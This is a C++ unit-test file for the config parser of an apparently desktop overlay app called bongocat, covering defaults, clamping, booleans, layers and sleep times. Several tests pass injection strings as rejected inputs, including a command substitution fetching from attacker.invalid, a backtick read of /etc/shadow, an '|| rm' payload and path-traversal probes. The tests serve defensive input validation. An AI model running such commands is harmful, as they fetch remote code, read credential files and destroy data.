#include "config/config.h"
#include "core/bongocat.h"
#include "utils/error.h"
#include "utils/system_error.h"

#include <doctest/doctest.h>
#include <string>

namespace bongocat {

bongocat::config::config_t config_load_ok(const char *content) {
  auto res = config::load_from_string(content);
  CHECK(bongocat::config::is_valid_config_result(res));
  return bongocat::move(res.config);
}

}  // namespace bongocat

TEST_CASE("empty config") {
  using namespace bongocat;

  const auto cfg = config_load_ok("");

  CHECK(cfg.fps > 0);
  CHECK(cfg.cat_height > 0);
  CHECK(cfg.enable_antialiasing == true);
  CHECK(cfg.cat_align == bongocat::config::align_type_t::ALIGN_CENTER);
  CHECK(cfg.layer == bongocat::config::layer_type_t::LAYER_TOP);
  CHECK(cfg.overlay_position == bongocat::config::overlay_position_t::POSITION_TOP);
}

TEST_CASE("blank lines and comments") {
  using namespace bongocat;

  const auto cfg = config_load_ok(R"(
# this is a comment


fps=35
# another comment
)");
  CHECK(cfg.fps == 35);
}

TEST_CASE("whitespaces and comments") {
  using namespace bongocat;

  const auto cfg = config_load_ok(R"(
# This is a comment
  fps = 35  # inline comment


; semicolon comment
cat_height = 100
)");
  CHECK(cfg.fps == 35);
  CHECK(cfg.cat_height == 100);
}

TEST_CASE("comment stripping") {
  using namespace bongocat;

  SUBCASE("inline comment is stripped from value") {
    const auto cfg = config_load_ok("cat_align=center #notacomment\n");
    CHECK(cfg.cat_align == bongocat::config::align_type_t::ALIGN_CENTER);
  }
  SUBCASE("value before semicolon-ish comment in monitor") {
    const auto cfg = config_load_ok("monitor=DP-1;#inject\n");
    CHECK(strcmp(cfg.output_name.c_str(), "DP-1") == 0);
  }
}

TEST_CASE("null filename") {
  using namespace bongocat;
  auto res = config::load(BONGOCAT_NULLPTR, {});
  CHECK(!bongocat::config::is_valid_config_result(res));
  CHECK(has_flag(res.result.fatal, config::config_parsing_fatal_t::ConfigFilenameEmpty));
}

TEST_CASE("config not found - strict") {
  using namespace bongocat;
  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", {.strict = 1});
  CHECK(!bongocat::config::is_valid_config_result(res));
}

TEST_CASE("config not found - default fallback") {
  using namespace bongocat;
  auto res = config::load("./examples/test/abc.test.bongocat.conf.not.found", {});
  CHECK(bongocat::config::is_valid_config_result(res));
}

TEST_CASE("integer clamping") {
  using namespace bongocat;
  using namespace bongocat;

  const auto config = config_load_ok(R"(fps=99999
cat_height=0
overlay_opacity=-50
overlay_height=1
)");

  CHECK(config.fps < 99999);
  CHECK(config.cat_height != 0);
  CHECK(config.overlay_opacity == 0);
  CHECK(config.overlay_height > 1);
}

TEST_CASE("time parsing") {
  using namespace bongocat;

  const auto config = config_load_ok(R"(enable_scheduled_sleep=1
sleep_begin=22:30
sleep_end=06:15
)");

  CHECK(config.sleep_begin.hour == 22);
  CHECK(config.sleep_begin.min == 30);
  CHECK(config.sleep_end.hour == 6);
  CHECK(config.sleep_end.min == 15);
}

TEST_CASE("invalid integer") {
  using namespace bongocat;

  const auto res = config::load_from_string("fps=abc", {});

  CHECK(bongocat::config::is_valid_config_result(res));
  CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidInteger));
  CHECK(res.config.fps >= 30);
}

TEST_CASE("invalid integer - strict") {
  using namespace bongocat;

  const auto res = config::load_from_string("fps=abc", {.strict = 1});

  CHECK(!bongocat::config::is_valid_config_result(res));
  CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidInteger));
  CHECK(res.config.fps >= 30);
}
TEST_CASE("integer overflow") {
  using namespace bongocat;

  const auto config = config_load_ok(R"(fps=999999999999999999999999
cat_height=99999999999999999999
overlay_opacity=-999999999999999999999
overlay_height=0xDEADBRRF
)");

  CHECK(config.fps < 99999);
  CHECK(config.cat_height != 0);
  CHECK(config.overlay_opacity == 0);
  CHECK(config.overlay_height > 1);
}

TEST_CASE("overwrite keys") {
  using namespace bongocat;

  const auto config = config_load_ok(R"(fps=10
fps=20
fps=30
fps=40
)");

  CHECK(config.fps == 40);
}

TEST_CASE("boolean values") {
  using namespace bongocat;

  SUBCASE("true variants") {
    const auto config = config_load_ok(R"(
mirror_x=true
mirror_y=yes
enable_antialiasing=on
)");

    CHECK(config.mirror_x);
    CHECK(config.mirror_y);
    CHECK(config.enable_antialiasing);
  }

  SUBCASE("false variants") {
    const auto config = config_load_ok(R"(
mirror_x=true
mirror_y=yes
enable_antialiasing=on
)");

    CHECK(config.mirror_x);
    CHECK(config.mirror_y);
    CHECK(config.enable_antialiasing);
  }

  SUBCASE("integers") {
    const auto config = config_load_ok(R"(
mirror_x=1
mirror_y=0
)");

    CHECK(config.mirror_x);
    CHECK(!config.mirror_y);
  }

  SUBCASE("invalid") {
    const auto config = config_load_ok(R"(
mirror_x=abcd
enable_antialiasing=qwer
)");

    CHECK(!config.mirror_x);
    CHECK(config.enable_antialiasing);
  }
}

TEST_CASE("layer") {
  using namespace bongocat;

  SUBCASE("top") {
    CHECK(config_load_ok("overlay_layer=top\n").layer == config::layer_type_t::LAYER_TOP);
  }
  SUBCASE("bottom") {
    CHECK(config_load_ok("overlay_layer=bottom\n").layer == config::layer_type_t::LAYER_BOTTOM);
  }
  SUBCASE("overlay") {
    CHECK(config_load_ok("overlay_layer=overlay\n").layer == config::layer_type_t::LAYER_OVERLAY);
  }
  SUBCASE("background") {
    CHECK(config_load_ok("overlay_layer=background\n").layer == config::layer_type_t::LAYER_BACKGROUND);
  }
  SUBCASE("deprecated layer= key still works") {
    CHECK(config_load_ok("layer=top\n").layer == config::layer_type_t::LAYER_TOP);
  }
  SUBCASE("invalid falls back to top and sets error") {
    auto res = config::load_from_string("overlay_layer=middle\n");
    CHECK(res.config.layer == config::layer_type_t::LAYER_TOP);
    CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidLayer));
  }
  SUBCASE("shell payload in layer value is rejected") {
    auto res = config::load_from_string("overlay_layer=overlay || rm ./bongocat.conf.example\n");
    CHECK(res.config.layer != config::layer_type_t::LAYER_OVERLAY);
    CHECK(has_flag(res.result.errors, config::config_parsing_error_t::InvalidLayer));
  }
}

TEST_CASE("monitor") {
  using namespace bongocat;

  SUBCASE("valid output name accepted") {
    const auto cfg = config_load_ok("monitor=DP-1\n");
    CHECK(cfg.output_name);
    CHECK(strcmp(cfg.output_name.c_str(), "DP-1") == 0);
  }
  SUBCASE("HDMI style accepted") {
    const auto cfg = config_load_ok("monitor=HDMI-A-1\n");
    CHECK(cfg.output_name);
    CHECK(strcmp(cfg.output_name.c_str(), "HDMI-A-1") == 0);
  }
  SUBCASE("empty monitor clears output name") {
    const auto cfg = config_load_ok("monitor=\n");
    CHECK(!cfg.output_name);
  }
  SUBCASE("shell payload rejected") {
    auto res = config::load_from_string("monitor=DP-1 || cat bongocat.conf.example\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
  }
  SUBCASE("path rejected") {
    auto res = config::load_from_string("monitor=/dev/random\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
  }
  SUBCASE("env variable expansion probe rejected") {
    auto res = config::load_from_string("monitor=$DISPLAY\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidMonitorName));
  }
}

TEST_CASE("keyboard_device") {
  using namespace bongocat;

  SUBCASE("valid path accepted") {
    const auto cfg = config_load_ok("keyboard_device=/dev/input/event0\n");
    CHECK(cfg.num_keyboard_devices >= 1);
  }
  SUBCASE("path traversal rejected") {
    auto res = config::load_from_string("keyboard_device=../../../../dev/mem\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("path traversal rejected 2") {
    auto res = config::load_from_string("keyboard_device=/dev/input/../shadow\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("shell command injection rejected") {
    auto res = config::load_from_string("keyboard_device=$(curl attacker.invalid/payload)\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("backtick injection rejected") {
    auto res = config::load_from_string("keyboard_device=`cat /etc/shadow`\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("or payload rejected") {
    auto res = config::load_from_string("keyboard_device=/dev/input/event0 || rm ./bongocat.conf.example\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("empty path rejected") {
    auto res = config::load_from_string("keyboard_device=\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("invalid input devicepath") {
    auto res = config::load_from_string("keyboard_device=/etc/passwd\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidInputDeviceName));
    CHECK(res.config.num_keyboard_devices == 0);
  }
  SUBCASE("multiple devices accepted") {
    const auto cfg = config_load_ok(R"(
          keyboard_device=/dev/input/event0
          keyboard_device=/dev/input/event1
      )");
    CHECK(cfg.num_keyboard_devices >= 2);
  }
  SUBCASE("more multiple devices accepted") {
    const auto cfg = config_load_ok(R"(
        keyboard_device=/dev/input/event00
        keyboard_device=/dev/input/event01
        keyboard_device=/dev/input/event02
        keyboard_device=/dev/input/event03
        keyboard_device=/dev/input/event04
        keyboard_device=/dev/input/event05
        keyboard_device=/dev/input/event06
        keyboard_device=/dev/input/event07
        keyboard_device=/dev/input/event08
        keyboard_device=/dev/input/event09
        keyboard_device=/dev/input/event10
        keyboard_device=/dev/input/event11
        keyboard_device=/dev/input/event12
        keyboard_device=/dev/input/event13
        keyboard_device=/dev/input/event14
        keyboard_device=/dev/input/event15
        keyboard_device=/dev/input/event16
        keyboard_device=/dev/input/event17
        keyboard_device=/dev/input/event18
        keyboard_device=/dev/input/event19
        keyboard_device=/dev/input/event20
        keyboard_device=/dev/input/event21
    )");
    CHECK(cfg.num_keyboard_devices == 22);
  }
  SUBCASE("duplicated multiple devices accepted") {
    const auto cfg = config_load_ok(R"(
        keyboard_device=/dev/input/event00
        keyboard_device=/dev/input/event01
        keyboard_device=/dev/input/event01
        keyboard_device=/dev/input/event02
        keyboard_device=/dev/input/event04
        keyboard_device=/dev/input/event05
        keyboard_device=/dev/input/event03
        keyboard_device=/dev/input/event07
        keyboard_device=/dev/input/event08
        keyboard_device=/dev/input/event09
        keyboard_device=/dev/input/event11
        keyboard_device=/dev/input/event11
        keyboard_device=/dev/input/event11
        keyboard_device=/dev/input/event13
        keyboard_device=/dev/input/event14
        keyboard_device=/dev/input/event120
        keyboard_device=/dev/input/event20
        keyboard_device=/dev/input/event11
        keyboard_device=/dev/input/event18
        keyboard_device=/dev/input/event23
        keyboard_device=/dev/input/event23
        keyboard_device=/dev/input/event25
    )");
    CHECK(cfg.num_keyboard_devices == 22);
  }
}

TEST_CASE("keyboard_name") {
  using namespace bongocat;

  SUBCASE("valid name accepted") {
    const auto cfg = config_load_ok("keyboard_name=My Keyboard\n");
    CHECK(cfg._num_keyboard_names >= 1);
  }
  SUBCASE("empty name rejected") {
    auto res = config::load_from_string("keyboard_name=\n");
    // empty name is useless, should be skipped
    CHECK(res.config._num_keyboard_names == 0);
  }
  SUBCASE("format string probe stored safely") {
    // %s%s%s should be stored as a plain string, not interpreted
    const auto cfg = config_load_ok("keyboard_name=%s%s%s%s\n");
    CHECK(cfg._num_keyboard_names <= 1);
  }
}

TEST_CASE("malformed lines") {
  using namespace bongocat;

  SUBCASE("line with no equals sign is skipped") {
    auto res = config_load_ok("overlay_height\n");
  }
  SUBCASE("line starting with = is skipped") {
    auto res = config_load_ok("=\n");
  }
  SUBCASE("double equals treated as unknown or invalid") {
    auto res = config_load_ok("overlay_height==80\n");
  }
  SUBCASE("unknown key") {
    auto res = config_load_ok("oooooooooverlay___heigght=80\n");
  }
  SUBCASE("quoted key is unknown") {
    auto res = config_load_ok("\"overlay_height\"=80\n");
  }
  SUBCASE("colon separator is unknown key") {
    auto res = config_load_ok("overlay_height:80\n");
  }
  SUBCASE("ini section header is skipped") {
    auto res = config_load_ok("[overlay]\n");
  }
  SUBCASE("non-printable key is rejected") {
    // Simulate a key with a non-printable byte
    auto config = config_load_ok("\x01overlay_height=200\n");
    CHECK(config.overlay_height != 200);
  }
  SUBCASE("trailing garbage on fps rejected by integer parser") {
    auto res = config::load_from_string("fps=65;;;;;;;\n");
    CHECK(res.config.fps == 65);
  }
}

TEST_CASE("malformed lines - strict-mode") {
  using namespace bongocat;

  SUBCASE("double equals treated as unknown or invalid") {
    auto res = config::load_from_string("overlay_height==80\n", {.strict = 1});

    CHECK(!bongocat::config::is_valid_config_result(res));
  }
  SUBCASE("trailing garbage on fps rejected by integer parser") {
    auto res = config::load_from_string("fps=65;;;;;;;\n", {.strict = 1});
    CHECK(res.config.fps == 65);
  }
}

TEST_CASE("unknown keys") {
  using namespace bongocat;

  auto res = config::load_from_string(R"(
overlay.opacity=101
overlay:opacity=101
opacity=101
)");
  CHECK(has_flag(res.result.infos, bongocat::config::config_parsing_info_t::UnknownConfigKey));
  CHECK(res.result.errors == bongocat::config::config_parsing_error_t::Success);
  CHECK(res.config.overlay_opacity != 101);
}

TEST_CASE("strict mode") {
  using namespace bongocat;

  SUBCASE("valid config passes strict mode") {
    auto res = config::load_from_string("fps=60\ncat_height=40\n", {.strict = 1});
    CHECK(bongocat::config::is_valid_config_result(res));
  }
  SUBCASE("missing file fails in strict mode") {
    using namespace bongocat::config;
    load_config_overwrite_parameters_t params;
    params.strict = 1;
    auto res = bongocat::config::load("/tmp/bongocat_no_such_file_xyzzy.conf", params);
    CHECK(!is_valid_config_result(res));
    CHECK(has_flag(res.result.fatal, config_parsing_fatal_t::ConfigNotFound));
  }
  SUBCASE("invalid animation name fails in strict mode") {
    auto res = config::load_from_string("animation_name=does_not_exist\n", {.strict = 1});
    CHECK(!bongocat::config::is_valid_config_result(res));
  }
  SUBCASE("max devices warning fails in strict mode") {
    // Build a config with more keyboard_name entries than MAX_INPUT_DEVICES
    std::string content;
    // keyboard_name is a warning when full — strict should catch it
    for (int i = 0; i < 1024; ++i) {
      content += "keyboard_name=FakeDevice\n";
    }
    auto res = config::load_from_string(content.c_str(), {.strict = 1});
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::MaxDeviceNamesReached));
  }
  SUBCASE("invalid layer error fails in strict mode") {
    auto res = config::load_from_string("overlay_layer=invalid_layer\n", {.strict = 1});
    CHECK(!bongocat::config::is_valid_config_result(res));
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidLayer));
  }
}

TEST_CASE("overwrite parameters") {
  using namespace bongocat;

  SUBCASE("output_name overwrite takes priority") {
    config::load_config_overwrite_parameters_t params{};
    params.output_name = "HDMI-A-1";
    auto res = config::load_from_string("monitor=DP-1\n", params);
    CHECK(is_valid_config_result(res));
    CHECK(res.config.output_name);
    CHECK(strcmp(res.config.output_name.c_str(), "HDMI-A-1") == 0);
  }
  SUBCASE("randomize_index overwrite") {
    config::load_config_overwrite_parameters_t params{};
    params.randomize_index = 1;
    auto res = config::load_from_string("random=false\n", params);
    CHECK(is_valid_config_result(res));
    CHECK(res.config.randomize_index);
  }
}


TEST_CASE("scheduled sleep") {
  using namespace bongocat;

  SUBCASE("valid times accepted") {
    const auto cfg = bongocat::config_load_ok(R"(
enable_scheduled_sleep=true
sleep_begin=22:00
sleep_end=08:00
)");
    CHECK(cfg.enable_scheduled_sleep);
    CHECK(cfg.sleep_begin.hour == 22);
    CHECK(cfg.sleep_begin.min == 0);
    CHECK(cfg.sleep_end.hour == 8);
    CHECK(cfg.sleep_end.min == 0);
  }
  SUBCASE("equal begin and end disables sleep") {
    auto res = config::load_from_string(R"(
enable_scheduled_sleep=true
sleep_begin=08:00
sleep_end=08:00
)");
    CHECK(!res.config.enable_scheduled_sleep);
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
  }
  SUBCASE("invalid hour rejected") {
    auto res = config::load_from_string("sleep_begin=25:61\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
  }
  SUBCASE("non-numeric time rejected") {
    auto res = config::load_from_string("sleep_end=AA:BB\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
  }
  SUBCASE("path traversal in time value rejected") {
    auto res = config::load_from_string("sleep_end=../../../../bin/bash\n");
    CHECK(has_flag(res.result.errors, bongocat::config::config_parsing_error_t::InvalidSleepTime));
  }
}